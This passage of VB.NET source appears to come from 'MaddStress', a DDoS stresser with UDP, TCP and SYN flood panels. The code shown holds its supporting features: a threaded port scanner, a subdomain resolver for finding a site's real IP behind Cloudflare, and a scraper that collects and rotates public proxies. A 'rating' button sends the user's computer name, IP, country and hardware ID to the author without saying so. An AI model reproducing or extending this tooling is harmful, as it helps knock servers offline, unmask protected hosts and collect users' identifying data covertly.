            Dim tmpEndPoint As New IPEndPoint(IPAddress.Parse(MainTextIPPORTSCANNER.Text), Port)
            tmpClient.Connect(tmpEndPoint)
            Threading.Thread.Sleep(100)
            If tmpClient.Connected = True Then
                MainListPORTSCANNER.Items.Add(MainTextIPPORTSCANNER.Text & ", Open port at: " & Port)
                Methods.addHistoryItem(MainTextIPPORTSCANNER.Text & ", Open port at: " & Port)
            End If
        Catch ex As Exception
        End Try
        My.Settings.Save()
        updateHistory()

    End Sub


    Private Sub MainBWThread_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles MainBWTHREAD.DoWork

        MainListPORTSCANNER.Items.Clear()
        Dim startAt As Integer = CInt(MainTextPORT.Text)
        Dim stopAt As Integer = CInt(MainTextPORT2.Text)
        Control.CheckForIllegalCrossThreadCalls = False 'Now you can Add items through a thread
        For i As Integer = startAt To stopAt
            Dim tmpThread As New System.Threading.Thread(AddressOf ScanPort)
            tmpThread.IsBackground = True
            tmpThread.Start(i) 'i represents the current port 
            MainButtonPORTSCAN.Text = "Stop"
        Next
        MainButtonPORTSCAN.Text = "Scan"

    End Sub


    Private Sub MainTimerHome_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainTimerHOME.Tick

        Methods.updateFavorites()
        Methods.updateHistory()
        Methods.updateTF()
        MainTimerHOME.Interval = My.Settings.DAUL

    End Sub


    Private Sub MainButtonCLEARFAVORITES_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonCLEARFAVORITES.Click

        My.Settings.FavIP.Clear()
        My.Settings.FavName.Clear()
        My.Settings.FavNotes.Clear()
        Methods.updateFavorites()

    End Sub


    Private Sub MainButtonHISTORY_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonCLEARHISTORY.Click

        My.Settings.History.Clear()
        Methods.updateHistory()

    End Sub


    Private Sub MainLabelCLEAR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainLabelCLEAR.Click

        My.Settings.TotalFloods = 0
        Methods.updateTF()

    End Sub


    Private Sub MainButtonRESOLVE_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonRESOLVE.Click

        Try
            Dim Hostname = Dns.GetHostEntry(MainTextHOSTURL.Text)
            Dim ip As IPAddress() = Hostname.AddressList

        Catch ex As Exception
            MsgBox("Please make sure you are connected to the internet", MsgBoxStyle.Exclamation, "")
        End Try
        Try
            For i = 0 To My.Settings.TestDomains.Count
                Dim Hostname = Dns.GetHostEntry(My.Settings.TestDomains.Item(i) & MainTextHOSTURL.Text)
                Dim ip As IPAddress() = Hostname.AddressList
                Try
                    MainTextORIGINALIP.Text = ip(0).ToString
                Catch ex As Exception
                    MsgBox("Please make sure you are connected to the internet", MsgBoxStyle.Exclamation, "")
                End Try
            Next
        Catch ex As Exception
        End Try

    End Sub


    Private Sub MainButtonUDP_Click(sender As Object, e As EventArgs) Handles MainButtonUDP.Click

        MainPanelHome2.Visible = True
        MainPanelUDP.BringToFront()
        MainPanelUDP.Visible = True

    End Sub


    Private Sub MainButtonTCP_Click(sender As Object, e As EventArgs) Handles MainButtonTCP.Click

        MainPanelHome2.Visible = True
        MainPanelTCP.BringToFront()
        MainPanelTCP.Visible = True

    End Sub


    Private Sub MainButtonSYN_Click(sender As Object, e As EventArgs) Handles MainButtonSYN.Click

        MainPanelHome2.Visible = True
        MainPanelSYN.BringToFront()
        MainPanelSYN.Visible = True

    End Sub


    Private Sub MainButtonCPANEL_Click(sender As Object, e As EventArgs) Handles MainButtonCPANEL.Click

        MainPanelHome2.Visible = True
        MainPanelCPANEL.BringToFront()
        MainPanelCPANEL.Visible = True

    End Sub


    Private Sub MainButtonPORTSCANNER_Click(sender As Object, e As EventArgs) Handles MainButtonPORTSCANNER.Click

        MainPanelHome2.Visible = True
        MainPanelPORTSCANNER.BringToFront()
        MainPanelPORTSCANNER.Visible = True

    End Sub


    Private Sub MainButtonURLTOIP_Click(sender As Object, e As EventArgs) Handles MainButtonURLTOIP.Click

        MainPanelHome2.Visible = True
        MainPanelURLTOIP.BringToFront()
        MainPanelURLTOIP.Visible = True

    End Sub


    Private Sub MainButtonCLOUDFLARE_Click(sender As Object, e As EventArgs) Handles MainButtonCLOUDFLARE.Click

        MainPanelHome2.Visible = True
        MainPanelCLOUDFLARE.BringToFront()
        MainPanelCLOUDFLARE.Visible = True

    End Sub


    Private Sub MainButtonHISTORY_Click_1(sender As Object, e As EventArgs) Handles MainButtonHISTORY.Click

        MainPanelHome2.Visible = True
        MainPanelINFORMATION.BringToFront()
        MainPanelINFORMATION.Visible = True

    End Sub


    Private Sub MainButtonPROXY_Click(sender As Object, e As EventArgs) Handles MainButtonPROXY.Click

        MainPanelHome2.Visible = True
        MainPanelPROXY.BringToFront()
        MainPanelPROXY.Visible = True

    End Sub


    Private Sub MainButtonHELP_Click(sender As Object, e As EventArgs) Handles MainButtonHELP.Click

        'HELP
        Process.Start("IExplore.exe", "https://discord.DrWeabo.com")

    End Sub


    Private Sub MainTextPINGADDRESS_IconRightClick(sender As Object, e As EventArgs) Handles MainTextPINGADDRESS.IconRightClick

        'Ping Address
        If My.Computer.Network.Ping(MainTextPINGADDRESS.Text) Then
            MsgBox("Server pinged successfully/Server is up.", MsgBoxStyle.Information)
        Else
            MsgBox("Ping request timed out/Server is down.", MsgBoxStyle.Critical)
        End If

    End Sub


    Private Sub MainButtonHOME_Click(sender As Object, e As EventArgs) Handles MainButtonHOME.Click

        Process.Start("IExplore.exe", "https://www.DrWeabo.com")
        Process.Start("IExplore.exe", "https://www.youtube.com/DrWeabo")

    End Sub


    Private Sub MainButtonDONATE_Click(sender As Object, e As EventArgs) Handles MainButtonDONATE.Click

        Process.Start("IExplore.exe", "https://paypal.me/DrWeabo")

    End Sub


    Private Sub MainButtonDASHBOARD_Click(sender As Object, e As EventArgs) Handles MainButtonDASHBOARD.Click

        MainPanelHome2.Visible = True
        MainPanelDASHBOARD.BringToFront()
        MainPanelDASHBOARD.Visible = True

    End Sub


    Private Sub MainButtonMULTIRESOLVE_Click(sender As Object, e As EventArgs) Handles MainButtonMULTIRESOLVE.Click

        Domains(0) = "blog."
        Domains(1) = "cpanel."
        Domains(2) = "dev."
        Domains(3) = "direct."
        Domains(4) = "direct-connect."
        Domains(5) = "ftp."
        Domains(6) = "forum."
        Domains(7) = "mail."
        Domains(8) = "m."
        Domains(9) = "cdn."
        Domains(10) = "test."
        Domains(11) = "static."
        Domains(12) = "beta."
        Domains(13) = "imap."
        Domains(14) = "pop."
        Domains(15) = "api."
        Domains(16) = ""
        MainTextDOMAIN.Text = MainTextDOMAIN.Text.Replace("http://", "")
        MainTextDOMAIN.Text = MainTextDOMAIN.Text.Replace("Http://", "")
        MainTextDOMAIN.Text = MainTextDOMAIN.Text.Replace("www.", "")
        MainTextDOMAIN.Text = MainTextDOMAIN.Text.Replace("/", "")
        If MainTextDOMAIN.Text = "" Then
            MessageBox.Show("Please enter a domain! Remember: Leave out 'http://' and 'www.'")
        Else
            For Each Str As String In Domains
                Try
                    Dim hostname As IPHostEntry = Dns.GetHostByName(Str + MainTextDOMAIN.Text)
                    Dim ip As IPAddress() = hostname.AddressList
                    MainListRESOLVE.Items.Add(Str + MainTextDOMAIN.Text + ": " + ip(0).ToString())
                Catch ex As Exception
                    MainListRESOLVE.Items.Add(Str + MainTextDOMAIN.Text + ": Not Found")
                End Try
            Next
        End If
        'Made by DrWeabo, Give donate please :}'

    End Sub


    Private Sub MainButtonCLEAR_Click(sender As Object, e As EventArgs) Handles MainButtonCLEAR.Click

        MainListRESOLVE.Items.Clear()

    End Sub

    Private Sub MainButtonLOADLISTPROXY_Click(sender As Object, e As EventArgs) Handles MainButtonLOADLISTPROXY.Click

        'Load ListBox Text
        Dim Name As String
        MainOpenFile.Filter = ""
        MainOpenFile.FilterIndex = 2
        On Error GoTo ErrHandler
        MainOpenFile.ShowDialog()
        MainOpenFile.FileName = MainOpenFile.FileName
        FileOpen(3, MainOpenFile.FileName, OpenMode.Input)
        Do While Not EOF(3)
            Name = LineInput(3)
            If Len(Trim(Name)) > 0 Then
                MainListPROXY.Items.Add(Trim(Name))
            End If
        Loop
        FileClose(3)
        Exit Sub
ErrHandler:
        Exit Sub

    End Sub


    Private Sub MainButtonPROXYGENERATOR_Click(sender As Object, e As EventArgs) Handles MainButtonPROXYGENERATOR.Click

        'Proxy Grabber
        MainTimerPROXYGEN.Start()

    End Sub


    Private Sub MainButtonCLEAR2_Click(sender As Object, e As EventArgs) Handles MainButtonCLEAR2.Click

        MainListPROXY.Items.Clear()

    End Sub


    Private Sub MainProxies_Tick(sender As Object, e As EventArgs) Handles MainTimerPROXY.Tick

        UseProxy(MainListPROXY.Text)
        MainListPROXY.SelectedIndex += 1

    End Sub


    Private Sub MainTimerCPU_Tick(sender As Object, e As EventArgs) Handles MainTimerCPU.Tick

        'Timer CPU
        CPU = MainCounterCPU.NextValue()
        RAM = MainCounterRAM.NextValue()

    End Sub


    Private Sub MainTimerRAM_Tick(sender As Object, e As EventArgs) Handles MainTimerRAM.Tick

        'Timer RAM
        If MainGaugeCPU.Value < CPU Then
            MainGaugeCPU.Value += 1
        ElseIf MainGaugeCPU.Value > CPU Then
            MainGaugeCPU.Value -= 1
        End If

        If MainGaugeRAM.Value < RAM Then
            MainGaugeRAM.Value += 1
        ElseIf MainGaugeRAM.Value > RAM Then
            MainGaugeRAM.Value -= 1
        End If

    End Sub


    Private Sub MainTimerCPUTEMPERATURE_Tick(sender As Object, e As EventArgs) Handles MainTimerCPUTEMPERATURE.Tick

        'CPU Temperature
        Try
            Dim searcher As New ManagementObjectSearcher("root\WMI", "SELECT * FROM MSAcpi_ThermalZoneTemperature")
            For Each queryObj As ManagementObject In searcher.Get()
                Dim Temperature As Double = CDbl(queryObj("CurrentTemperature"))
                Temperature = (temperature - 2732) / 10.0
                MainGaugeCPUTEMPERATURE.Value = Temperature.ToString
            Next
        Catch err As ManagementException
            MsgBox(err.Message & ". You do not have the required administrative privileges to run this program for check temperature CPU.", MsgBoxStyle.Critical)
            Application.ExitThread()
        End Try

    End Sub


    Private Sub MainButtonDONATE2_Click(sender As Object, e As EventArgs) Handles MainButtonDONATE2.Click

        Process.Start("IExplore.exe", "https://paypal.me/DrWeabo")

    End Sub


    Private Sub MainButtonYOUTUBE_Click(sender As Object, e As EventArgs) Handles MainButtonYOUTUBE.Click

        Process.Start("IExplore.exe", "https://youtube.com/DrWeabo")

    End Sub

    Private Sub MainButtonUPDATES_Click(sender As Object, e As EventArgs) Handles MainButtonUPDATES.Click

        Dim Result As Integer = MessageBox.Show("New version available, please restart and download new version, Download updates now?", "MaddStress | New Updates", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
        If Result = DialogResult.Yes Then
            'Auto Updates
            My.Computer.Network.DownloadFile("https://tools.drweabo.com/releases/maddstress/MaddStress.zip", "MaddStress.zip")

            'Messages when done`
            Dim Result2 As Integer = MessageBox.Show("Successfully, now check on MaddStress.zip, are you open the files?", "MaddStress", MessageBoxButtons.YesNo, MessageBoxIcon.Information)
            If Result2 = DialogResult.Yes Then

                'Auto Start
                Process.Start("MaddStress.zip")

                'Auto Exit Application
                Application.ExitThread()
            End If
        End If

    End Sub


    Private Sub MainButtonADDSTAR_Click(sender As Object, e As EventArgs) Handles MainButtonADDSTAR.Click

        '<--- Create a HWID --->

        Dim HW As New clsComputerInfo
        Dim CPU As String
        Dim MB As String
        Dim MAC As String
        Dim HWID As String
        CPU = HW.GetProcessorId()
        MB = HW.GetMotherboardID()
        MAC = HW.GetMACAddress()
        HWID = CPU + MB + MAC
        Dim hwidEncrypted As String = Strings.UCase(HW.getMD5Hash(CPU & MB & MAC))
        HWID = hwidEncrypted
        Dim HWIDTEXT As String = HWID

        '<--- Create a HWID --->

        Dim Target As String = ("DrWeabo@gmail.com")
        Dim Subject As String = ("MADDSTRESS | RATING STAR | ADDED By " + My.Computer.Name.ToString)
        Dim Message As String = ("INFORMATION RATING STAR FOR APPLICATION > " + Application.ProductName.ToString + vbCrLf + vbCrLf + "NAME : " + My.Computer.Name.ToString + vbCrLf + "OPERATING SYSTEM : " + My.Computer.Info.OSFullName.ToString + vbCrLf + "IP ADDRESS : " + GetMYIP() + vbCrLf + "COUNTRY : " + (GetInfo(LOCALE_SENGCOUNTRY)) + vbCrLf + "HWID : " + HWIDTEXT + vbCrLf + "STAR RATING : " + MainButtonSTAR.Value.ToString + " (1 - 5 STAR)" + vbCrLf + "VERSION : " + Application.ProductVersion.ToString)
        Dim Amount As String = ("1")
        Dim Senders As String = ("MaddStress@gmail.com")

        'SENDING
        Dim Result As String = Star.DownloadString(Api + "?target=" + Target + "&subject=" + Subject + "&message=" + Message + "&amount=" + Amount + "&sender=" + Senders)

        'SHOW MESSAGE
        MsgBox("Terimakasih telah memberikan rating kepada alat kami!", MsgBoxStyle.Information, "")

    End Sub


    Private Sub MainTimerPROXYGEN_Tick(sender As Object, e As EventArgs) Handles MainTimerPROXYGEN.Tick

        'Proxy Grabber
        Dim downloader As New WebClient
        Dim downloader2 As New WebClient
        downloader.Encoding = Encoding.UTF8
        downloader2.Encoding = Encoding.UTF8
        Dim mystring As String = downloader.DownloadString("http://www.sslproxies24.top/feeds/posts/default")
        Dim mystring2 As String = downloader2.DownloadString("https://api.proxyscrape.com/?request=displayproxies&proxytype=HTTP&timeout=10000")

        Dim myregex As String = "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}"
        Dim source As String = mystring + mystring2
        Dim findme As MatchCollection = Regex.Matches(source, myregex)
        For Each mymatch As Match In findme
            MainListPROXY.Items.Add(mymatch)
        Next

        MainLabelAMOUNTPROXY.Text = "Proxies: " + MainListPROXY.Items.Count.ToString()

    End Sub


    Private Sub MainButtonSTOPPROXY_Click(sender As Object, e As EventArgs) Handles MainButtonSTOPPROXY.Click

        MainTimerPROXYGEN.Stop()
        MsgBox("Successfully generated of " & MainListPROXY.Items.Count.ToString & " Proxies!")

    End Sub
End Class
